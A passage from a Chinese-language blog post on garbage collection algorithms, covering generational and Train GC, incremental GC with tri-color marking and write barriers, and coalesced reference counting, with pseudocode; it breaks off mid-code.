title="缺点"></a>缺点</h5><ol><li><code>可能起反作用</code>：虽然“很多对象年纪轻轻就会死”毕竟只适合大部分那情况，并不适用于所有程序。当那少部分的程序使用分代的方式处理时不仅新生代GC花费的时间会增多，老年代的GC也会频繁运行，写入记录集的操作也会降低吞吐量。</li><li><code>最大暂停时间问题</code>：老年代使用了GC标记-清除算法，对于最大暂停时间有影响。</li><li><code>跨代的循环引用无法一次性回收</code>：只有等新生代的对象年龄到了放在老年代才能得到处理。</li><li><code>记录集比较占用空间</code>：每有一个老年代指向新生代的对象，就会占用一个字存放在记录集中。</li></ol><h4 id="优化措施-5"><a href="#优化措施-5" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="记录各代之间的引用的方法"><a href="#记录各代之间的引用的方法" class="headerlink" title="记录各代之间的引用的方法"></a>记录各代之间的引用的方法</h5><p>解决的是<code>记录集比较占用空间</code>的问题，可以通过两种方式。</p><p>一是将老年代内存分为一节节的小内存，每节小内存如果有对象指向新生代空间，那么该节的标志位置为1 。但是当老年代对象比较多的时候，搜索每节内存都要花费大量时间。</p><p>二是通过操作系统的页面管理程序，很多操作系统都是以页面为单位来管理内存空间的。因此如果在卡片标记中将卡片和页面设置为同样大小，我们就能得到 OS 的帮助。实际上利用的也是第一点提到的思路，只不过有操作系统协助管理。但是这个方法只适用于能利用页面重写标志位或能利用内存保护功能的环境。而且不只搜索老年代到新生代会进行索引，老年代对老年代进行索引操作系统也会进行标记。</p><h5 id="多代垃圾回收"><a href="#多代垃圾回收" class="headerlink" title="多代垃圾回收"></a>多代垃圾回收</h5><p>它是为了解决<code>最大暂停时间问题</code>。分代垃圾回收将对象分为新生代和老年代，通过尽量减少从新生代晋升到老年代的对象，来减少在老年代对象上消耗的垃圾回收的时间。</p><p>但是如果代数太多，各代之间的引用就会变得更复杂，每代的空间也就越小，各代GC花费的时间也越长了。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210924171957812.png" alt="image-20210924171957812"></p><h5 id="Train-GC"><a href="#Train-GC" class="headerlink" title="Train GC"></a>Train GC</h5><p>该方法是为了解决<code>跨代的循环引用无法一次性回收</code>和<code>最大暂停时间问题</code>。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930104000476.png" alt="image-20210930104000476"></p><p>Train GC的特点有</p><ol><li>引入了“列车”与“车厢”的概念，GC的对象是第一个列车的第一个车厢。</li><li>新生代对象不在分为生成空间、2 个大小相等的幸存空间这三块空间了，而是仅仅只有一块新生代空间，毕竟To空间放在老年代空间里面了。</li><li>记录集有多个，并且是单向的（因为GC的对象仅仅在第一个列车里面）。新生代、列车、车厢都有记录集。</li></ol><p><code>新生代GC</code>将被引用的新生代对象复制到引用它的老年代对象的车厢中，并把根引用的新生代对象放入新的车厢中</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930111249965.png" alt="image-20210930111249965"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copy：将新生代对象复制到老年代的车厢中。</span></span><br><span class="line"><span class="built_in">copy</span>(obj, to_car)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.forwarded == FALSE)</span><br><span class="line">     <span class="keyword">if</span>(to_car.free + obj.size &gt;= to_car.start + CAR_SIZE)</span><br><span class="line">     to_car = <span class="built_in">new_car</span>(to_car)</span><br><span class="line">     <span class="built_in">copy_data</span>(to_car.free, obj, obj.size)</span><br><span class="line">     obj.forwarding = to_car.free</span><br><span class="line">     obj.forwarded = TRUE</span><br><span class="line">     to_car.free += obj.size</span><br><span class="line">     <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj.forwarding))</span><br><span class="line">     *child = <span class="built_in">copy</span>(*child, to_car)</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// minor_gc：将具有引用关系的对象被安排到了同一辆列车里，如果空间不够则安排到新车厢中。</span></span><br><span class="line"><span class="built_in">minor_gc</span>()&#123;</span><br><span class="line"> to_car = <span class="built_in">new_car</span>(<span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="keyword">if</span>(*r &lt; $old_start)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r, to_car)</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">for</span>(remembered_obj : $young_rs)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(*remembered_obj))</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> to_car = <span class="built_in">get_last_car</span>(<span class="built_in">obj_to_car</span>(*remembered_obj))<span class="comment">// 该行将具有引用关系的对象被安排到了同一辆列车里。这方便在老年代GC的时候回收整个车厢。</span></span><br><span class="line"> *child = <span class="built_in">copy</span>(*child, to_car)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而正常的老年代GC流程则是按照搜索第一个列车-&gt;第一节车厢的顺序清空第一个车厢的活动对象并进行垃圾回收。先把列车一被其他列车引用的对象复制到其他列车中，如图7.14。之后再将1.1车厢被列车一其他车厢引用的对象复制出去，这样车厢一的活动对象就已经被清空了。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210924181640772.png" alt="image-20210924181640772"></p><p>而当列车一没有其他列车引用其中的对象时，可以将列车一这个列车一并回收。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930111325106.png" alt="image-20210930111325106"></p><p>【优点】可以减少<code>最大暂停时间</code>，因为每次进行GC的只是一节车厢，只占堆中比较小的一部分。</p><p>【优点】可以回收循环垃圾，毕竟通过列车的记录集就可以知道这个列车是不是孤儿，如果是则将整个列车回收。</p><p>【缺点】因为记录集变多了，所以吞吐量更低了，占用的空间也相应的增加。</p><p>【缺点】如果对象大小大于一个车厢，该算法就不能对他进行处理，需要安排到新生代和老年代以外的堆进行回收。</p><h3 id="增量式垃圾回收（Incremental-GC）"><a href="#增量式垃圾回收（Incremental-GC）" class="headerlink" title="增量式垃圾回收（Incremental GC）"></a>增量式垃圾回收（Incremental GC）</h3><h4 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h4><p>如果当GC执行的时间过长导致这段时间mutator完全不能工作，那么就将这种GC叫做停止型GC。根据mutator的用途不同，有时候停止型GC是非常要命的。因此我们可以采用慢慢发生变化的方式进行GC，这种方式叫做<code>增量式垃圾回收</code>。停止型GC和增量式垃圾回收图如下。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926165352020.png" alt="image-20210926165352020"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926165416813.png" alt="image-20210926165416813"></p><p>描述增量式垃圾回收的算法可以方便的使用三色标记算法（Tri-color marking）。</p><ul><li>白色：还未搜索过的对象</li><li>灰色：正在搜索的对象</li><li>黑色：搜索完成的对象</li></ul><p>以 GC 标记 - 清除算法为例：</p><ol><li><code>根查找阶段</code>：GC 开始运行前所有的对象都是白色。GC 一开始运行，所有从根直接到达的对象都会被放到栈里并被标记为灰色。</li><li><code>标记阶段</code>：灰色对象会被依次从栈中取出，其子对象也会被涂成灰色。当其所有的子对象都被涂成灰色时，对象就会被涂成黑色。</li><li><code>清除阶段</code>：当 GC 结束时已经不存在灰色对象了，活动对象全部为黑色，垃圾则为白色。这时将白色对象全部回收。</li></ol><p>三色标记算法这个概念不仅能应用于 GC标记 - 清除算法，还能应用于其他所有搜索型 GC 算法。这里面有个数据结构存放要遍历标记的对象叫做标记栈，标记栈里面存放的一定是灰色对象，代表里面的对象需要进行处理。而从标记栈中出来的对象则会被涂成黑色，代表处理完毕并且它是个活动对象。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/webp.webp" alt="img"></p><h4 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// incremental_gc：增量式垃圾回收。分为三个阶段——根查找阶段、标记阶段、清除阶段。</span></span><br><span class="line"><span class="built_in">incremental_gc</span>()&#123;</span><br><span class="line"> <span class="keyword">case</span> $<span class="function">gc_phase</span></span><br><span class="line"><span class="function"> when GC_ROOT_SCAN</span></span><br><span class="line"><span class="function"> <span class="title">root_scan_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> when GC_MARK</span></span><br><span class="line"><span class="function"> <span class="title">incremental_mark_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> <span class="keyword">else</span></span></span><br><span class="line"><span class="function"> <span class="title">incremental_sweep_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// root_scan_phase：根查找阶段将根直接引用的对象标灰。也就是将其放入标记栈中。</span></span></span><br><span class="line"><span class="function"><span class="title">root_scan_phase</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="built_in">mark</span>(*r)</span><br><span class="line"> $gc_phase = GC_MARK</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> obj.mark = TRUE</span><br><span class="line"> <span class="built_in">push</span>(obj, $mark_stack)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental_mark_phase：增量标记阶段，此时标记栈中是根直接索引的对象，增量标记阶段则将这些根直接索引的对象继续遍历，将栈中每个元素直接引用的对象标灰并压入标记栈中，然后将该元素自己标为黑色。当然是有次数限制的：为MARK_MAX，要不也不能叫做增量式垃圾回收了，毕竟要一块一块的进行操作。达到为MARK_MAX限制时会暂停标记阶段，之后执行mutator保证进程的暂停时间不至于过长。可以看出这里的搜索方式是部分深度优先搜索，根查找阶段是广搜，增量标记阶段是深搜（因为采取了栈结构，后进入的对象先处理）。</span></span><br><span class="line"><span class="built_in">incremental_mark_phase</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(i : <span class="number">1.</span>.MARK_MAX)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_empty</span>($mark_stack) == FALSE)</span><br><span class="line"> obj = <span class="built_in">pop</span>($mark_stack)</span><br><span class="line">     <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line">         <span class="built_in">mark</span>(*child)</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">         <span class="keyword">for</span>(r : $roots)</span><br><span class="line">            <span class="built_in">mark</span>(*r)</span><br><span class="line"> <span class="keyword">while</span>(<span class="built_in">is_empty</span>($mark_stack) == FALSE)</span><br><span class="line">     obj = <span class="built_in">pop</span>($mark_stack)</span><br><span class="line">     <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line">     <span class="built_in">mark</span>(*child)</span><br><span class="line">     </span><br><span class="line"> $gc_phase = GC_SWEEP</span><br><span class="line"> $sweeping = $heap_start</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental_sweep_phase：增量清除阶段，执行了SWEEP_MAX次，遍历整个堆空间，白色的对象一定为垃圾对象，所以要将其回收。黑色的对象则为活动对象，将其涂成白色方便下一次的标记阶段。</span></span><br><span class="line"><span class="built_in">incremental_sweep_phase</span>()&#123;</span><br><span class="line"> swept_count = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(swept_count &lt; SWEEP_MAX)</span><br><span class="line"> <span class="keyword">if</span>($sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>($sweeping.mark == TRUE)</span><br><span class="line"> $sweeping.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> $sweeping.next = $free_list</span><br><span class="line"> $free_list = $sweeping</span><br><span class="line"> $free_size += $sweeping.size</span><br><span class="line"> $sweeping += $sweeping.size</span><br><span class="line"> swept_count++</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> $gc_phase = GC_ROOT_SCAN</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newobj：分配新对象的过程，还是和之前区别不大，这里需要注意的一点就是清除阶段是分段进行的，这样就将堆分为两块空间。分别是已清除完毕的空间和尚未清除完毕的空间，将内存分配在在以清除完毕的空间中不需要做任何事，清除代码也不会处理那块空间，但是如果将内存分配在尚未清除完毕的空间，那么清除程序后续会执行到这里，就需要将这个新分配的对象涂黑。</span></span><br><span class="line"><span class="built_in">newobj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($free_size &lt; HEAP_SIZE * GC_THRESHOLD)</span><br><span class="line"> <span class="built_in">incremental_gc</span>()</span><br><span class="line">     </span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> chunk.size = size</span><br><span class="line"> $free_size -= size</span><br><span class="line"> <span class="keyword">if</span>($gc_phase == GC_SWEEP &amp;&amp; $sweeping &lt;= chunk)</span><br><span class="line"> chunk.mark = TRUE</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930115412869.png" alt="image-20210930115412869"></p><h5 id="标记遗漏"><a href="#标记遗漏" class="headerlink" title="标记遗漏"></a>标记遗漏</h5><p>当进程由GC的标记阶段切换到mutator运行时，如果执行了这样一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> C = objB.fieldC;</span><br><span class="line">objA.fieldB = <span class="keyword">null</span>;  </span><br><span class="line">objA.fieldC = C;  </span><br><span class="line">objB.fieldC = <span class="keyword">null</span>;  </span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930115707655.png" alt="image-20210930115707655"></p><p>此时由B-&gt;C的引用转到了A-&gt;C的引用上。而A已经被涂黑，也就是说他不在标记栈中了，也就不会处理A了。此时如果又从mutator运行状态切换到GC的标记阶段时，本来应该继续通过mark(B)给C打上标记，但是此时C是由A索引的了。C就成孤儿了，如果C本身是个活动对象，那么由于无法对C进行涂色导致可能会释放活动对象的状况，从而导致程序异常。</p><h5 id="写入屏障"><a href="#写入屏障" class="headerlink" title="写入屏障"></a>写入屏障</h5><p>如果新引用的对象 newobj 是白色对象，就把它涂成灰色。(迪杰斯特拉的写入屏障)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write_barrier：这里的mark可能表示灰色或者黑色，区分灰和黑的方式就是它是否在标记栈中，在标记栈中说明它没有被处理也就是灰色，而不在标记栈中说明已经被处理完了所以是黑色。</span></span><br><span class="line"><span class="comment">// 这里的逻辑比较清晰，在(a)-&gt;(b)的过程中判断新空间是否被标记，如果没有标记则将其标记，也就是变为灰色，这里不用担心A和B是白色的问题。因为这里既然可以被程序引用就说明他们肯定是活动对象。</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, newobj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(newobj.mark == FALSE)</span><br><span class="line"> newobj.mark = TRUE</span><br><span class="line"> <span class="built_in">push</span>(newobj, $mark_stack)</span><br><span class="line"> *field = newobj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926195627433.png" alt="image-20210926195627433"></p><h4 id="评估-6"><a href="#评估-6" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-6"><a href="#优点-6" class="headerlink" title="优点"></a>优点</h5><p><code>缩短最大暂停时间</code>： GC 与 mutator 交替运行，因此不会长时间妨碍 mutator 运行。</p><h5 id="缺点-6"><a href="#缺点-6" class="headerlink" title="缺点"></a>缺点</h5><p><code>降低了吞吐量</code>：用到了写入屏障，增大了处理的额外负担。</p><h4 id="其他实现方式"><a href="#其他实现方式" class="headerlink" title="其他实现方式"></a>其他实现方式</h4><h5 id="Steele的算法"><a href="#Steele的算法" class="headerlink" title="Steele的算法"></a><strong>Steele</strong>的算法</h5><p>由Steele 1975年开发的算法。这个算法和上面有一点区别，这里obj.mark为True就代表它为黑色，而标记为False则代表它为灰色或者白色。区分灰色和白色的方式和上面相同，就是判断对象是否在标记栈中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mark：与上面mark的区别是灰色的obj.mark值也是FALSE，而上面的obj.mark值为True。</span></span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> <span class="built_in">push</span>(obj, $mark_stack)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write_barrier：如果在标记过程中发出引用的对象是黑色对象，且新的引用的目标对象为灰色或白色，那么我们就把发出引用的对象涂成灰色。将A重新压栈这样之后仍然可以通过A来遍历到C。</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, newobj)&#123;</span><br><span class="line"> <span class="keyword">if</span>($gc_phase == GC_MARK &amp;&amp;</span><br><span class="line"> obj.mark == TRUE &amp;&amp; newobj.mark == FALSE)</span><br><span class="line"> obj.mark = FALSE</span><br><span class="line"> <span class="built_in">push</span>(obj, $mark_stack)</span><br><span class="line"> *field = newobj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926195555725.png" alt="image-20210926195555725"></p><h5 id="汤浅太一的算法（Snapshot-GC）"><a href="#汤浅太一的算法（Snapshot-GC）" class="headerlink" title="汤浅太一的算法（Snapshot GC）"></a>汤浅太一的算法（Snapshot GC）</h5><p>1990 年汤浅太一开发，也称为“快照 GC”（Snapshot GC）。核心在于它会处理B-&gt;C的指针，即使A-&gt;C黑色对象指向白色对象也没有关系。在B-&gt;C置为null时会触发写屏障， 这时会判断C是否为白色，如果为白色将其涂灰。</p><p>写入屏障实现方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write_barrier：这个写入屏障和刚刚两个不同的地方在于它发生在取消指针的阶段（也就是B-&gt;C的阶段），前两个都是在转移指针的阶段（也就是从A-&gt;C的阶段）</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, newobj)&#123;</span><br><span class="line"> oldobj = *field</span><br><span class="line"> <span class="keyword">if</span>(gc_phase == GC_MARK &amp;&amp; oldobj.mark == FALSE)</span><br><span class="line"> oldobj.mark = TRUE</span><br><span class="line"> <span class="built_in">push</span>(oldobj, $mark_stack)</span><br><span class="line"> *field = newobj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newobj：这里和前面的分配对象的实现方式有所不同，前面的分配会判断空间是在已清除完毕的空间还是尚未清除完毕的空间，已清除空间则不同处理，默认为白色，未清除空间则涂黑防止活动对象被清除阶段处理。但是在这里无条件将其涂黑，虽然之后的清楚阶段也有可能将其回收，但是仍然在一段时间内保留了垃圾对象，</span></span><br><span class="line"><span class="built_in">newobj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($free_size &lt; HEAP_SIZE * GC_THRESHOLD)</span><br><span class="line"> <span class="built_in">incremental_gc</span>()</span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> chunk.size = size</span><br><span class="line"> $free_size -= size</span><br><span class="line"> <span class="keyword">if</span>($gc_phase == GC_MARK)</span><br><span class="line"> chunk.mark = TRUE</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>($gc_phase == GC_SWEEP &amp;&amp; $sweeping &lt;= chunk)</span><br><span class="line"> chunk.mark = TRUE</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210926200451535.png" alt="image-20210926200451535"></p><h4 id="三种方式的比较"><a href="#三种方式的比较" class="headerlink" title="三种方式的比较"></a>三种方式的比较</h4><table><thead><tr><th>提出者</th><th>A</th><th>B</th><th>C</th><th>时机</th><th>动作</th></tr></thead><tbody><tr><td>Dijkstra</td><td>-</td><td>-</td><td>白</td><td>A-&gt;B</td><td>将C涂灰</td></tr><tr><td>Steele</td><td>黑</td><td>-</td><td>白或者黑</td><td>A-&gt;B</td><td>将A恢复成黑色</td></tr><tr><td>汤浅</td><td>-</td><td>白</td><td>-</td><td>B-&gt;C</td><td>将C涂灰</td></tr></tbody></table><p>这样看来，它们 3 个各不相同。实际上不仅是写入屏障，在分配等方面也存在着差异，所以我们没法简单地进行比较。不过即使存在着这么大的差异，各种写入屏障也都能顺畅运行。</p><h3 id="RC-Immix算法"><a href="#RC-Immix算法" class="headerlink" title="RC Immix算法"></a>RC Immix算法</h3><h4 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h4><p>传统的引用计数法有一大缺点，吞吐量过低。本次介绍的两种方式都会改善其吞吐量到可以实际应用的级别，但是其最大暂停时间可能会有相应的增长，毕竟没有一种算法是完美的。</p><h4 id="合并型引用计数法"><a href="#合并型引用计数法" class="headerlink" title="合并型引用计数法"></a>合并型引用计数法</h4><p>合并型引用计数法是 2001 年由 Yossi Levanoni 和 Erez Petrank 开发的算法。常规的引用计数法步骤可能会造成计数器的频繁修改，造成很大的系统开销，如下所示</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210927110533064.png" alt="image-20210927110533064"></p><p>引用计数法在之前介绍过一个可以提高系统吞吐量的方式，叫做延迟引用计数法。从根引用的指针的变化不反映在计数器上。通过维护一个ZST表，即使频繁重写对象的引用关系也会降低系统开销。</p><p>不过在延迟引用计数法之上还可以进行优化。考虑到图9.1的情况，通过多次变化，(a)-&gt;(b)-&gt;(c)的变化被抵消掉了。如果我们把注意力放在某一时期最初和最后的状态上，在此期间不进行计数器的增减，这样就可以减少很多无效的计算。这种方式就叫做合并型引用计数法。将指针的改动信息注册到更改缓冲区（Modified Buffer）。大致的过程如下图，(e)步骤实际上A的引用计数经过处理后应该变为1，而B则变为2 。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210927111652087.png" alt="image-20210927111652087"></p><p>我们将指针改动了的 X 和指针改动前被 X 引用的 A 注册到了更改缓冲区。结束时X指向了B。之后对B的计数器加一，对A的计数器减一。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// garbage_collect：先进行加法再进行减法的目的是和之前一样，为了确保A和B是同一对象的情况也能顺利运行。</span></span><br><span class="line"><span class="built_in">garbage_collect</span>()&#123;</span><br><span class="line"> foreach(entry : $mod_buf)</span><br><span class="line"> obj = entry.obj</span><br><span class="line"> foreach(child : obj)</span><br><span class="line"> <span class="built_in">inc_ref_cnt</span>(child)</span><br><span class="line"> foreach(child : entry.children)</span><br><span class="line"> <span class="built_in">dec_ref_cnt</span>(child)</span><br><span class="line"> obj.dirty = <span class="literal">false</span></span><br><span class="line"> <span class="built_in">clear</span>($mod_buf)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write_barrier_coalesced_RC：写入屏障的作用就是确保对象进入更改缓冲区（Modified Buffer）</span></span><br><span 